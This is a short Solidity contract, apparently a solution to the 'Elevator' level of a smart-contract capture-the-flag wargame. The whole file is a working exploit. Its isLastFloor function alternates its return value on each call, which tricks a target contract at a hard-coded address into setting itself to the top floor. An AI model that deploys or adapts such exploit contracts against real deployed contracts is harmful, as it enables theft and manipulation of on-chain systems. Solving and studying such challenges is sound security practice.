// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {

    Elevator constant private target = Elevator(0xB1092Eed9f891efF6C136f54eee0b33FBB0a7E72);

    bool flag = false;

    function attack() public{
        target.goTo(100);
    }
    
    function isLastFloor(uint floor) external returns (bool){
       bool _flag = flag;
       flag = !flag;
       return _flag;
   }
}